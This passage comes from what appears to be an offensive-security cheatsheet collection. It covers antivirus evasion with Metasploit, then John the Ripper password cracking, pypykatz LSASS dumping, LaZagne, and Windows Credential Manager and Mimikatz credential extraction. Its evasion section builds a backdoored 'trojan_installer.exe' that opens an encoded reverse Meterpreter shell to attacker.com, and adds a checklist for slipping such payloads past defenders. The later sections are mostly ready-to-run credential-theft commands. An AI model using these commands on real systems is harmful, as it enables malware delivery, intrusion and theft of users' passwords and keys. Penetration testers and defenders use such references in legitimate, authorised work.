<tr><td><strong>ExeStealth</strong></td><td>Anti-debugging protection</td></tr>
<tr><td><strong>Morphine</strong></td><td>Polymorphic packer</td></tr>
</tbody>
</table>
</div>
<h3 id="upx-example"><a class="header" href="#upx-example">UPX Example</a></h3>
<pre><code class="language-bash"># Pack executable
upx -9 payload.exe -o packed_payload.exe

# Unpack (for analysis)
upx -d packed_payload.exe
</code></pre>
<hr>
<h2 id="common-encoders-1"><a class="header" href="#common-encoders-1">Common Encoders</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Encoder</th><th>Rank</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>x86/shikata_ga_nai</code></td><td>Excellent</td><td>Polymorphic XOR Additive Feedback</td></tr>
<tr><td><code>x64/xor</code></td><td>Manual</td><td>Simple XOR encoder</td></tr>
<tr><td><code>x64/zutto_dekiru</code></td><td>Manual</td><td>Zutto Dekiru encoder</td></tr>
<tr><td><code>x86/alpha_mixed</code></td><td>Low</td><td>Alphanumeric mixedcase</td></tr>
<tr><td><code>x86/unicode_mixed</code></td><td>Low</td><td>Unicode mixedcase</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="exploit-code-randomization"><a class="header" href="#exploit-code-randomization">Exploit Code Randomization</a></h2>
<p>When writing exploit code, add offset randomization to break IDS signatures:</p>
<pre><code class="language-ruby">'Targets' =&gt;
[
 [ 'Windows 2000 SP4 English', { 'Ret' =&gt; 0x77e14c29, 'Offset' =&gt; 5093 } ],
],
</code></pre>
<hr>
<h2 id="msf6-aes-encryption"><a class="header" href="#msf6-aes-encryption">MSF6 AES Encryption</a></h2>
<p>MSF6 supports AES-encrypted communication for Meterpreter sessions:</p>
<pre><code class="language-bash"># Meterpreter runs in memory with encrypted tunnel
set payload windows/x64/meterpreter/reverse_https
set EnableStageEncoding true
set StageEncoder x64/xor
</code></pre>
<hr>
<h2 id="quick-reference"><a class="header" href="#quick-reference">Quick Reference</a></h2>
<h3 id="generate-stealthy-payload"><a class="header" href="#generate-stealthy-payload">Generate Stealthy Payload</a></h3>
<pre><code class="language-bash"># Backdoored installer with encoding
msfvenom -p windows/meterpreter/reverse_https LHOST=attacker.com LPORT=443 \
  -x legit_installer.exe -k \
  -e x86/shikata_ga_nai -i 10 \
  -f exe -o trojan_installer.exe
</code></pre>
<h3 id="handler-setup-for-encrypted-session"><a class="header" href="#handler-setup-for-encrypted-session">Handler Setup for Encrypted Session</a></h3>
<pre><code class="language-bash">use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
set EnableStageEncoding true
run -j
</code></pre>
<hr>
<h2 id="evasion-checklist"><a class="header" href="#evasion-checklist">Evasion Checklist</a></h2>
<ul>
<li><input disabled="" type="checkbox"> Use executable templates (<code>-x</code> flag)</li>
<li><input disabled="" type="checkbox"> Enable <code>-k</code> for legitimate functionality</li>
<li><input disabled="" type="checkbox"> Apply multiple encoding iterations</li>
<li><input disabled="" type="checkbox"> Consider using packers</li>
<li><input disabled="" type="checkbox"> Use password-protected archives for delivery</li>
<li><input disabled="" type="checkbox"> Leverage HTTPS/encrypted channels</li>
<li><input disabled="" type="checkbox"> Randomize exploit offsets</li>
<li><input disabled="" type="checkbox"> Avoid obvious NOP sleds</li>
<li><input disabled="" type="checkbox"> Test against sandbox before deployment</li>
</ul>
<hr>
<h2 id="references"><a class="header" href="#references">References</a></h2>
<ul>
<li><a href="https://www.ftc.gov/equifax-data-breach">US Government Post-Mortem Report on Equifax Hack</a></li>
<li><a href="https://www.infoblox.com/">Protecting from DNS Exfiltration</a></li>
<li><a href="https://github.com/polypack">PolyPack Project</a></li>
<li>Metasploit - The Penetration Tester‚Äôs Guide (No Starch Press)</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="john-the-ripper-cheatsheet"><a class="header" href="#john-the-ripper-cheatsheet">John the Ripper Cheatsheet</a></h1>
<h2 id="basic-syntax-2"><a class="header" href="#basic-syntax-2">Basic Syntax</a></h2>
<pre><code>john [options] &lt;hash_file&gt;
</code></pre>
<hr>
<h2 id="cracking-modes"><a class="header" href="#cracking-modes">Cracking Modes</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Mode</th><th>Option</th><th>Description</th><th>Example</th></tr>
</thead>
<tbody>
<tr><td>Single</td><td><code>--single</code></td><td>Rule-based cracking using username/GECOS data</td><td><code>john --single passwd</code></td></tr>
<tr><td>Wordlist</td><td><code>--wordlist=FILE</code></td><td>Dictionary attack with wordlist</td><td><code>john --wordlist=rockyou.txt hashes.txt</code></td></tr>
<tr><td>Incremental</td><td><code>--incremental</code></td><td>Brute-force using Markov chains</td><td><code>john --incremental hashes.txt</code></td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="common-options-4"><a class="header" href="#common-options-4">Common Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th><th>Example</th></tr>
</thead>
<tbody>
<tr><td><code>--format=FORMAT</code></td><td>Specify hash format</td><td><code>john --format=raw-md5 hashes.txt</code></td></tr>
<tr><td><code>--wordlist=FILE</code></td><td>Use wordlist for dictionary attack</td><td><code>john --wordlist=passwords.txt hashes.txt</code></td></tr>
<tr><td><code>--rules</code></td><td>Apply word mangling rules</td><td><code>john --wordlist=words.txt --rules hashes.txt</code></td></tr>
<tr><td><code>--show</code></td><td>Display cracked passwords</td><td><code>john --show hashes.txt</code></td></tr>
<tr><td><code>--pot=FILE</code></td><td>Specify pot file location</td><td><code>john --pot=custom.pot hashes.txt</code></td></tr>
<tr><td><code>--session=NAME</code></td><td>Name the session for restore</td><td><code>john --session=crack1 hashes.txt</code></td></tr>
<tr><td><code>--restore=NAME</code></td><td>Restore a previous session</td><td><code>john --restore=crack1</code></td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="common-hash-formats"><a class="header" href="#common-hash-formats">Common Hash Formats</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Format</th><th>Option</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td>MD5</td><td><code>--format=raw-md5</code></td><td>Raw MD5 hashes</td></tr>
<tr><td>SHA1</td><td><code>--format=raw-sha1</code></td><td>Raw SHA1 hashes</td></tr>
<tr><td>SHA256</td><td><code>--format=raw-sha256</code></td><td>Raw SHA256 hashes</td></tr>
<tr><td>SHA512</td><td><code>--format=raw-sha512</code></td><td>Raw SHA512 hashes</td></tr>
<tr><td>SHA512crypt</td><td><code>--format=sha512crypt</code></td><td>Linux $6$ hashes</td></tr>
<tr><td>MD5crypt</td><td><code>--format=md5crypt</code></td><td>Linux $1$ hashes</td></tr>
<tr><td>bcrypt</td><td><code>--format=bcrypt</code></td><td>Blowfish-based hashes</td></tr>
<tr><td>NT</td><td><code>--format=nt</code></td><td>Windows NT hashes</td></tr>
<tr><td>LM</td><td><code>--format=LM</code></td><td>LAN Manager hashes</td></tr>
<tr><td>NTLM</td><td><code>--format=netntlm</code></td><td>NTLM network hashes</td></tr>
<tr><td>NTLMv2</td><td><code>--format=netntlmv2</code></td><td>NTLMv2 network hashes</td></tr>
<tr><td>Kerberos 5</td><td><code>--format=krb5</code></td><td>Kerberos 5 hashes</td></tr>
<tr><td>MySQL</td><td><code>--format=mysql-sha1</code></td><td>MySQL SHA1 hashes</td></tr>
<tr><td>MSSQL</td><td><code>--format=mssql</code></td><td>MS SQL hashes</td></tr>
<tr><td>Oracle</td><td><code>--format=oracle11</code></td><td>Oracle 11 hashes</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="2john-conversion-tools"><a class="header" href="#2john-conversion-tools">2john Conversion Tools</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Tool</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>zip2john</code></td><td>Convert ZIP archives</td></tr>
<tr><td><code>rar2john</code></td><td>Convert RAR archives</td></tr>
<tr><td><code>pdf2john</code></td><td>Convert PDF documents</td></tr>
<tr><td><code>ssh2john</code></td><td>Convert SSH private keys</td></tr>
<tr><td><code>keepass2john</code></td><td>Convert KeePass databases</td></tr>
<tr><td><code>office2john</code></td><td>Convert MS Office documents</td></tr>
<tr><td><code>putty2john</code></td><td>Convert PuTTY private keys</td></tr>
<tr><td><code>gpg2john</code></td><td>Convert GPG keys</td></tr>
<tr><td><code>wpa2john</code></td><td>Convert WPA/WPA2 handshakes</td></tr>
<tr><td><code>truecrypt_volume2john</code></td><td>Convert TrueCrypt volumes</td></tr>
<tr><td><code>bitlocker2john</code></td><td>Convert BitLocker volumes</td></tr>
<tr><td><code>7z2john.pl</code></td><td>Convert 7-Zip archives</td></tr>
</tbody>
</table>
</div>
<p><strong>Usage:</strong></p>
<pre><code>&lt;tool&gt; &lt;file_to_crack&gt; &gt; file.hash
john file.hash
</code></pre>
<hr>
<h2 id="useful-examples-5"><a class="header" href="#useful-examples-5">Useful Examples</a></h2>
<h3 id="crack-linux-shadow-file"><a class="header" href="#crack-linux-shadow-file">Crack Linux Shadow File</a></h3>
<pre><code>john --single passwd
</code></pre>
<h3 id="dictionary-attack-with-rules-1"><a class="header" href="#dictionary-attack-with-rules-1">Dictionary Attack with Rules</a></h3>
<pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt
</code></pre>
<h3 id="crack-specific-format"><a class="header" href="#crack-specific-format">Crack Specific Format</a></h3>
<pre><code>john --format=raw-md5 --wordlist=passwords.txt md5_hashes.txt
</code></pre>
<h3 id="show-cracked-passwords"><a class="header" href="#show-cracked-passwords">Show Cracked Passwords</a></h3>
<pre><code>john --show hashes.txt
</code></pre>
<h3 id="crack-zip-file"><a class="header" href="#crack-zip-file">Crack ZIP File</a></h3>
<pre><code>zip2john protected.zip &gt; zip.hash
john --wordlist=rockyou.txt zip.hash
</code></pre>
<h3 id="crack-ssh-private-key"><a class="header" href="#crack-ssh-private-key">Crack SSH Private Key</a></h3>
<pre><code>ssh2john id_rsa &gt; ssh.hash
john --wordlist=passwords.txt ssh.hash
</code></pre>
<h3 id="incremental-mode-brute-force"><a class="header" href="#incremental-mode-brute-force">Incremental Mode (Brute Force)</a></h3>
<pre><code>john --incremental hashes.txt
</code></pre>
<h3 id="resume-a-session"><a class="header" href="#resume-a-session">Resume a Session</a></h3>
<pre><code>john --restore=session_name
</code></pre>
<hr>
<h2 id="hunting-for-encrypted-files"><a class="header" href="#hunting-for-encrypted-files">Hunting for Encrypted Files</a></h2>
<h3 id="find-common-encrypted-file-types"><a class="header" href="#find-common-encrypted-file-types">Find common encrypted file types</a></h3>
<pre><code class="language-bash">for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*"); do
  echo -e "\nFile extension: " $ext
  find / -name *$ext 2&gt;/dev/null | grep -v "lib\|fonts\|share\|core"
done
</code></pre>
<h3 id="find-ssh-private-keys"><a class="header" href="#find-ssh-private-keys">Find SSH private keys</a></h3>
<pre><code class="language-bash">grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2&gt;/dev/null
</code></pre>
<h3 id="check-if-ssh-key-is-encrypted"><a class="header" href="#check-if-ssh-key-is-encrypted">Check if SSH key is encrypted</a></h3>
<pre><code class="language-bash">ssh-keygen -yf ~/.ssh/id_rsa
# If encrypted, prompts for passphrase
</code></pre>
<hr>
<h2 id="cracking-protected-files"><a class="header" href="#cracking-protected-files">Cracking Protected Files</a></h2>
<h3 id="crack-encrypted-ssh-key"><a class="header" href="#crack-encrypted-ssh-key">Crack Encrypted SSH Key</a></h3>
<pre><code class="language-bash">ssh2john.py SSH.private &gt; ssh.hash
john --wordlist=rockyou.txt ssh.hash
john ssh.hash --show
</code></pre>
<h3 id="crack-office-document"><a class="header" href="#crack-office-document">Crack Office Document</a></h3>
<pre><code class="language-bash">office2john.py Protected.docx &gt; protected-docx.hash
john --wordlist=rockyou.txt protected-docx.hash
john protected-docx.hash --show
</code></pre>
<h3 id="crack-pdf-file"><a class="header" href="#crack-pdf-file">Crack PDF File</a></h3>
<pre><code class="language-bash">pdf2john.py PDF.pdf &gt; pdf.hash
john --wordlist=rockyou.txt pdf.hash
john pdf.hash --show
</code></pre>
<hr>
<h2 id="cracking-protected-archives"><a class="header" href="#cracking-protected-archives">Cracking Protected Archives</a></h2>
<h3 id="crack-zip-file-1"><a class="header" href="#crack-zip-file-1">Crack ZIP File</a></h3>
<pre><code class="language-bash">zip2john ZIP.zip &gt; zip.hash
john --wordlist=rockyou.txt zip.hash
john zip.hash --show
</code></pre>
<h3 id="crack-openssl-encrypted-gzip"><a class="header" href="#crack-openssl-encrypted-gzip">Crack OpenSSL Encrypted GZIP</a></h3>
<pre><code class="language-bash"># Check file type
file GZIP.gzip
# Output: openssl enc'd data with salted password

# Brute-force with loop (errors expected, file extracts on success)
for i in $(cat rockyou.txt); do
  openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2&gt;/dev/null | tar xz
done
</code></pre>
<h3 id="crack-bitlocker-drive-1"><a class="header" href="#crack-bitlocker-drive-1">Crack BitLocker Drive</a></h3>
<pre><code class="language-bash">bitlocker2john -i Backup.vhd &gt; backup.hashes
grep "bitlocker\$0" backup.hashes &gt; backup.hash
john --wordlist=rockyou.txt backup.hash
</code></pre>
<hr>
<h2 id="mounting-bitlocker-drives-linux"><a class="header" href="#mounting-bitlocker-drives-linux">Mounting BitLocker Drives (Linux)</a></h2>
<pre><code class="language-bash"># Install dislocker
sudo apt-get install dislocker

# Create mount points
sudo mkdir -p /media/bitlocker /media/bitlockermount

# Mount and decrypt
sudo losetup -f -P Backup.vhd
sudo dislocker /dev/loop0p2 -u&lt;password&gt; -- /media/bitlocker
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount

# Unmount when done
sudo umount /media/bitlockermount
sudo umount /media/bitlocker
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="pypykatz-cheatsheet"><a class="header" href="#pypykatz-cheatsheet">pypykatz Cheatsheet</a></h1>
<h2 id="installation-1"><a class="header" href="#installation-1">Installation</a></h2>
<pre><code class="language-bash">pip3 install pypykatz
</code></pre>
<hr>
<h2 id="lsass-dump-analysis"><a class="header" href="#lsass-dump-analysis">LSASS Dump Analysis</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Command</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>pypykatz lsa minidump lsass.dmp</code></td><td>Parse LSASS dump</td></tr>
<tr><td><code>pypykatz lsa minidump lsass.dmp -o json</code></td><td>JSON output</td></tr>
<tr><td><code>pypykatz lsa minidump /path/ -r</code></td><td>Recursive directory</td></tr>
<tr><td><code>pypykatz live lsa</code></td><td>Live LSASS (Windows, admin)</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="registry-hive-extraction"><a class="header" href="#registry-hive-extraction">Registry Hive Extraction</a></h2>
<pre><code class="language-bash"># Full extraction
pypykatz registry --sam SAM --security SECURITY --system SYSTEM

# SAM only
pypykatz registry --sam SAM --system SYSTEM

# LSA secrets only
pypykatz registry --security SECURITY --system SYSTEM
</code></pre>
<hr>
<h2 id="dpapi--credential-manager"><a class="header" href="#dpapi--credential-manager">DPAPI / Credential Manager</a></h2>
<h3 id="decrypt-credential-files"><a class="header" href="#decrypt-credential-files">Decrypt Credential Files</a></h3>
<pre><code class="language-bash">pypykatz dpapi credential &lt;cred_file&gt; &lt;masterkey&gt;
pypykatz dpapi credentials &lt;creds_dir&gt; --mkf &lt;masterkey_file&gt;
</code></pre>
<h3 id="decrypt-vault-credentials"><a class="header" href="#decrypt-vault-credentials">Decrypt Vault Credentials</a></h3>
<pre><code class="language-bash">pypykatz dpapi vcrd &lt;vcrd_file&gt; &lt;masterkey&gt;
</code></pre>
<h3 id="decrypt-masterkey"><a class="header" href="#decrypt-masterkey">Decrypt Masterkey</a></h3>
<pre><code class="language-bash"># With password
pypykatz dpapi masterkey &lt;masterkey_file&gt; -p &lt;password&gt;

# With domain backup key
pypykatz dpapi masterkey &lt;masterkey_file&gt; --pvk &lt;backup.pvk&gt;

# Generate prekey
pypykatz dpapi prekey password &lt;SID&gt; &lt;password&gt;
</code></pre>
<hr>
<h2 id="quick-reference-1"><a class="header" href="#quick-reference-1">Quick Reference</a></h2>
<h3 id="create-lsass-dump-windows"><a class="header" href="#create-lsass-dump-windows">Create LSASS Dump (Windows)</a></h3>
<pre><code class="language-cmd">procdump.exe -ma lsass.exe lsass.dmp
</code></pre>
<pre><code class="language-cmd">rundll32 comsvcs.dll MiniDump &lt;PID&gt; lsass.dmp full
</code></pre>
<h3 id="export-registry-hives-windows"><a class="header" href="#export-registry-hives-windows">Export Registry Hives (Windows)</a></h3>
<pre><code class="language-cmd">reg save HKLM\SAM SAM
reg save HKLM\SECURITY SECURITY
reg save HKLM\SYSTEM SYSTEM
</code></pre>
<hr>
<h2 id="credential-locations"><a class="header" href="#credential-locations">Credential Locations</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Type</th><th>Path</th></tr>
</thead>
<tbody>
<tr><td>User Credentials</td><td><code>%AppData%\Microsoft\Credentials\</code></td></tr>
<tr><td>User Vault</td><td><code>%AppData%\Microsoft\Vault\</code></td></tr>
<tr><td>User Masterkeys</td><td><code>%AppData%\Microsoft\Protect\&lt;SID&gt;\</code></td></tr>
<tr><td>System Credentials</td><td><code>%SystemRoot%\System32\config\systemprofile\...</code></td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="output-formats"><a class="header" href="#output-formats">Output Formats</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Format</th></tr>
</thead>
<tbody>
<tr><td><code>-o text</code></td><td>Human-readable (default)</td></tr>
<tr><td><code>-o json</code></td><td>JSON</td></tr>
<tr><td><code>-o grep</code></td><td>Grep-friendly</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="common-workflows"><a class="header" href="#common-workflows">Common Workflows</a></h2>
<h3 id="offline-lsass-analysis"><a class="header" href="#offline-lsass-analysis">Offline LSASS Analysis</a></h3>
<pre><code class="language-bash"># 1. Dump on target
procdump.exe -ma lsass.exe lsass.dmp

# 2. Analyze on attacker (any OS)
pypykatz lsa minidump lsass.dmp
</code></pre>
<h3 id="credential-manager-extraction"><a class="header" href="#credential-manager-extraction">Credential Manager Extraction</a></h3>
<pre><code class="language-bash"># 1. Get masterkeys from LSASS
pypykatz lsa minidump lsass.dmp | grep -i dpapi

# 2. Decrypt credential file
pypykatz dpapi credential &lt;cred_file&gt; &lt;guid&gt;:&lt;key_hex&gt;
</code></pre>
<hr>
<h2 id="related-tools"><a class="header" href="#related-tools">Related Tools</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Tool</th><th>Use Case</th></tr>
</thead>
<tbody>
<tr><td>Mimikatz</td><td>Live Windows attacks</td></tr>
<tr><td>LaZagne</td><td>Application credentials</td></tr>
<tr><td>Impacket</td><td>Remote attacks</td></tr>
</tbody>
</table>
</div>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lazagne-cheatsheet"><a class="header" href="#lazagne-cheatsheet">LaZagne Cheatsheet</a></h1>
<h2 id="installation-2"><a class="header" href="#installation-2">Installation</a></h2>
<pre><code class="language-bash"># Windows: Download from releases
https://github.com/AlessandroZ/LaZagne/releases

# Linux/macOS
pip3 install -r requirements.txt
python3 laZagne.py all
</code></pre>
<hr>
<h2 id="basic-commands-1"><a class="header" href="#basic-commands-1">Basic Commands</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Command</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>laZagne.exe all</code></td><td>Extract all credentials</td></tr>
<tr><td><code>laZagne.exe all -quiet</code></td><td>Passwords only</td></tr>
<tr><td><code>laZagne.exe all -oJ</code></td><td>JSON output</td></tr>
<tr><td><code>laZagne.exe all -oN</code></td><td>Text file output</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="module-categories"><a class="header" href="#module-categories">Module Categories</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Category</th><th>Command</th></tr>
</thead>
<tbody>
<tr><td>Browsers</td><td><code>laZagne.exe browsers</code></td></tr>
<tr><td>Windows Creds</td><td><code>laZagne.exe windows</code></td></tr>
<tr><td>Sysadmin Tools</td><td><code>laZagne.exe sysadmin</code></td></tr>
<tr><td>Email Clients</td><td><code>laZagne.exe mails</code></td></tr>
<tr><td>Databases</td><td><code>laZagne.exe databases</code></td></tr>
<tr><td>WiFi</td><td><code>laZagne.exe wifi</code></td></tr>
<tr><td>Git</td><td><code>laZagne.exe git</code></td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="windows-credential-manager"><a class="header" href="#windows-credential-manager">Windows Credential Manager</a></h2>
<h3 id="extract-all-windows-credentials"><a class="header" href="#extract-all-windows-credentials">Extract All Windows Credentials</a></h3>
<pre><code class="language-bash">laZagne.exe windows
</code></pre>
<h3 id="specific-windows-modules"><a class="header" href="#specific-windows-modules">Specific Windows Modules</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Module</th><th>Command</th></tr>
</thead>
<tbody>
<tr><td>Credential Manager</td><td><code>laZagne.exe windows -m credman</code></td></tr>
<tr><td>Windows Vault</td><td><code>laZagne.exe windows -m vault</code></td></tr>
<tr><td>DPAPI Secrets</td><td><code>laZagne.exe windows -m dpapi</code></td></tr>
<tr><td>Auto-logon</td><td><code>laZagne.exe windows -m autologon</code></td></tr>
<tr><td>Cached Creds</td><td><code>laZagne.exe windows -m cachedump</code></td></tr>
<tr><td>SAM Hashes</td><td><code>laZagne.exe windows -m hashdump</code></td></tr>
<tr><td>LSA Secrets</td><td><code>laZagne.exe windows -m lsa_secrets</code></td></tr>
</tbody>
</table>
</div>
<h3 id="with-user-password-dpapi"><a class="header" href="#with-user-password-dpapi">With User Password (DPAPI)</a></h3>
<pre><code class="language-bash">laZagne.exe windows -password 'UserPassword123'
</code></pre>
<hr>
<h2 id="browser-credentials"><a class="header" href="#browser-credentials">Browser Credentials</a></h2>
<pre><code class="language-bash"># All browsers
laZagne.exe browsers

# Specific browser
laZagne.exe browsers -m chrome
laZagne.exe browsers -m firefox
laZagne.exe browsers -m chromiumedge
</code></pre>
<hr>
<h2 id="output-options-2"><a class="header" href="#output-options-2">Output Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>-quiet</code></td><td>Only show passwords</td></tr>
<tr><td><code>-oN</code></td><td>Save as text file</td></tr>
<tr><td><code>-oJ</code></td><td>Save as JSON</td></tr>
<tr><td><code>-oA</code></td><td>Save all formats</td></tr>
<tr><td><code>-output &lt;dir&gt;</code></td><td>Specify output directory</td></tr>
<tr><td><code>-v</code></td><td>Verbose</td></tr>
<tr><td><code>-vv</code></td><td>Extra verbose</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="advanced-options-1"><a class="header" href="#advanced-options-1">Advanced Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>-user &lt;name&gt;</code></td><td>Target specific user</td></tr>
<tr><td><code>-password &lt;pass&gt;</code></td><td>DPAPI decryption password</td></tr>
<tr><td><code>-local</code></td><td>Offline mode</td></tr>
</tbody>
</table>
</div>
<h3 id="offline-extraction"><a class="header" href="#offline-extraction">Offline Extraction</a></h3>
<pre><code class="language-bash">laZagne.exe all -local -sam SAM -security SECURITY -system SYSTEM
</code></pre>
<hr>
<h2 id="quick-one-liners"><a class="header" href="#quick-one-liners">Quick One-Liners</a></h2>
<h3 id="quiet-json-dump"><a class="header" href="#quiet-json-dump">Quiet JSON Dump</a></h3>
<pre><code class="language-bash">laZagne.exe all -quiet -oJ
</code></pre>
<h3 id="windows-creds-only"><a class="header" href="#windows-creds-only">Windows Creds Only</a></h3>
<pre><code class="language-bash">laZagne.exe windows -m credman -m vault -quiet
</code></pre>
<h3 id="all-browsers"><a class="header" href="#all-browsers">All Browsers</a></h3>
<pre><code class="language-bash">laZagne.exe browsers -quiet
</code></pre>
<hr>
<h2 id="linux-commands"><a class="header" href="#linux-commands">Linux Commands</a></h2>
<pre><code class="language-bash">python3 laZagne.py all
python3 laZagne.py browsers
python3 laZagne.py sysadmin
python3 laZagne.py memory
</code></pre>
<hr>
<h2 id="related-tools-1"><a class="header" href="#related-tools-1">Related Tools</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Tool</th><th>Use Case</th></tr>
</thead>
<tbody>
<tr><td>Mimikatz</td><td>LSASS memory extraction</td></tr>
<tr><td>pypykatz</td><td>Offline LSASS analysis</td></tr>
<tr><td>SharpDPAPI</td><td>C# DPAPI attacks</td></tr>
</tbody>
</table>
</div>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="windows-credential-manager-cheatsheet"><a class="header" href="#windows-credential-manager-cheatsheet">Windows Credential Manager Cheatsheet</a></h1>
<h2 id="credential-storage-locations"><a class="header" href="#credential-storage-locations">Credential Storage Locations</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Path</th><th>Scope</th></tr>
</thead>
<tbody>
<tr><td><code>%UserProfile%\AppData\Local\Microsoft\Vault\</code></td><td>User</td></tr>
<tr><td><code>%UserProfile%\AppData\Local\Microsoft\Credentials\</code></td><td>User</td></tr>
<tr><td><code>%UserProfile%\AppData\Roaming\Microsoft\Vault\</code></td><td>User</td></tr>
<tr><td><code>%ProgramData%\Microsoft\Vault\</code></td><td>System</td></tr>
<tr><td><code>%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\</code></td><td>System</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="credential-types"><a class="header" href="#credential-types">Credential Types</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Type</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td>Web Credentials</td><td>Websites/online accounts (IE, legacy Edge)</td></tr>
<tr><td>Windows Credentials</td><td>Domain users, services, network resources</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="enumeration"><a class="header" href="#enumeration">Enumeration</a></h2>
<h3 id="list-stored-credentials-cmdkey"><a class="header" href="#list-stored-credentials-cmdkey">List Stored Credentials (cmdkey)</a></h3>
<pre><code class="language-cmd">cmdkey /list
</code></pre>
<h3 id="output-fields"><a class="header" href="#output-fields">Output Fields</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Field</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td>Target</td><td>Resource/account name</td></tr>
<tr><td>Type</td><td><code>Generic</code> or <code>Domain Password</code></td></tr>
<tr><td>User</td><td>Associated account</td></tr>
<tr><td>Persistence</td><td><code>Local machine persistence</code> = survives reboots</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="exploitation"><a class="header" href="#exploitation">Exploitation</a></h2>
<h3 id="impersonate-stored-user-runas"><a class="header" href="#impersonate-stored-user-runas">Impersonate Stored User (runas)</a></h3>
<pre><code class="language-cmd">runas /savecred /user:DOMAIN\username cmd
</code></pre>
<h3 id="export-vaults-gui"><a class="header" href="#export-vaults-gui">Export Vaults (GUI)</a></h3>
<pre><code class="language-cmd">rundll32 keymgr.dll,KRShowKeyMgr
</code></pre>
<hr>
<h2 id="mimikatz-commands"><a class="header" href="#mimikatz-commands">Mimikatz Commands</a></h2>
<h3 id="dump-credentials-from-lsass"><a class="header" href="#dump-credentials-from-lsass">Dump Credentials from LSASS</a></h3>
<pre><code>privilege::debug
sekurlsa::credman
</code></pre>
<h3 id="list-vault-credentials"><a class="header" href="#list-vault-credentials">List Vault Credentials</a></h3>
<pre><code>vault::list
vault::cred
</code></pre>
<h3 id="dpapi-masterkey-extraction"><a class="header" href="#dpapi-masterkey-extraction">DPAPI Masterkey Extraction</a></h3>
<pre><code>sekurlsa::dpapi
dpapi::masterkey /in:&lt;masterkey_file&gt; /rpc
</code></pre>
<h3 id="decrypt-credential-file"><a class="header" href="#decrypt-credential-file">Decrypt Credential File</a></h3>
<pre><code>dpapi::cred /in:&lt;credential_file&gt;
</code></pre>
<hr>
<h2 id="powershell-enumeration"><a class="header" href="#powershell-enumeration">PowerShell Enumeration</a></h2>
<h3 id="list-web-credentials"><a class="header" href="#list-web-credentials">List Web Credentials</a></h3>
<pre><code class="language-powershell">[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll() | % { $_.RetrievePassword(); $_ }
</code></pre>
<h3 id="list-windows-credentials"><a class="header" href="#list-windows-credentials">List Windows Credentials</a></h3>
<pre><code class="language-powershell">cmdkey /list
</code></pre>
<hr>
<h2 id="related-tools-2"><a class="header" href="#related-tools-2">Related Tools</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Tool</th><th>Purpose</th></tr>
</thead>
<tbody>
<tr><td>Mimikatz</td><td>Credential extraction from memory/DPAPI</td></tr>
<tr><td>SharpDPAPI</td><td>C# DPAPI attacks</td></tr>
<tr><td>LaZagne</td><td>Multi-platform credential recovery</td></tr>
<tr><td>DonPAPI</td><td>Remote DPAPI extraction</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="key-files"><a class="header" href="#key-files">Key Files</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>File</th><th>Purpose</th></tr>
</thead>
<tbody>
<tr><td><code>Policy.vpol</code></td><td>Contains AES keys (protected by DPAPI)</td></tr>
<tr><td><code>*.vcrd</code></td><td>Vault credential files</td></tr>
<tr><td>Master key files</td><td>Located in <code>%AppData%\Microsoft\Protect\&lt;SID&gt;\</code></td></tr>
</tbody>
</table>
</div>
<div style="break-before: page; page-break-before: always;"></div>
